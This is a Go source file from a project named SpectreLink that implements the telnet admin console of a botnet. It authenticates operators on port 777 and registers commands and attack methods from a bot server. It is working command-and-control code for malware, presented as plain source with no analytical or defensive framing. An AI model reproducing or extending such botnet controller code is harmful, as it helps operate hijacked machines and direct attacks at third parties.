package telnet

import (
	"SpectreLink/admin/user"
	"SpectreLink/bot"
	"SpectreLink/log"
	"errors"
	"github.com/jessevdk/go-flags"
	"github.com/tester2024/telnet"
	"github.com/tester2024/telnet/options"
	"io"
	"sync"
)

type Server struct {
	botnet   *bot.Server
	sessions *sync.Map
	server   *telnet.Server
}

func (s *Server) HandleTelnet(conn *telnet.Connection) {
	session := s.createSession(conn)
	defer session.Destroy(s.deleteSession)

	if !session.DoAuthenticate() {
		session.Error("Failed to authenticate")
		session.ReadKey()
		return
	}

	session.UpdateSize()

	if err := session.SendBanner(); err != nil {
		return
	}

	session.RegisterCommands()
	session.RegisterMethods(s.botnet)

	go session.Handle()

	for command, err := session.ReadCommand(); command != nil; command, err = session.ReadCommand() {
		if err == nil {
			continue
		}

		var flagsErr *flags.Error
		switch {
		case errors.As(err, &flagsErr):
			switch {
			case errors.Is(flagsErr.Type, flags.ErrHelp):
				if err := session.Messagef("[#b6e3ff]%s[/#b6e3ff]\n", flagsErr.Message); err != nil {
					log.Exception(err)
				}
				continue
			default:
				if err := session.Error(flagsErr.Message); err != nil {
					log.Exception(err)
					return
				}
			}
		case errors.Is(err, io.EOF) || errors.Is(err, io.ErrUnexpectedEOF) || errors.Is(err, io.ErrClosedPipe) || errors.Is(err, io.ErrShortBuffer):
			return
		default:
			log.Exception(err, "Failed to read command")
		}
	}

}

func (s *Server) ListenAndServe(wg *sync.WaitGroup) {
	defer wg.Done()

	if err := s.server.ListenAndServe(); err != nil {
		panic(err)
	}
}

func (s *Server) createSession(conn *telnet.Connection) *user.TelnetSession {
	uid := conn.RemoteAddr().String()
	sess := user.NewUserSession(conn, uid)

	s.sessions.Store(uid, sess)

	return sess
}

func (s *Server) deleteSession(uid string) {
	s.sessions.Delete(uid)
}

func (s *Server) ListenAddr() any {
	return s.server.Address
}

func NewTelnetServer(botnet *bot.Server) *Server {
	t := &Server{
		sessions: new(sync.Map),
		botnet:   botnet,
	}

	t.server = telnet.NewServer(
		":777",
		t,
		options.EchoOption,
		options.SuppressGoAheadOption,
		options.NAWSOption,
	)
	return t
}
